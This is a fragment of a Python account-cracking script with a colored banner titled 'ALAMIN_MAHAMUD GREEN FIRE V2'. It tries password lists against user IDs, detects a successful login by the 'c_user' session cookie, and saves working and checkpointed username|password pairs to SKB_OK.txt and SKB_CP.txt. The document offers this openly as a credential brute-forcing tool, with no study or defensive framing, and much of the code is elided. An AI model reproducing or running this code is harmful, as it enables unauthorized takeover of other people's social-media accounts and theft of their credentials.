...
\033[1;98m█   ##    ## ####  ######  ##     ## ########    █
\033[1;99m╚════════════════════════════════════════════════╝
 \033[1;91m                     ALAMIN_MAHAMUD GREEN FIRE V2
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[SKB] {loop} | {len(self.id)} [ok] < > [{len(ok)}] < > [cp] < > [{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SKB-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SKB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SKB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SKB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
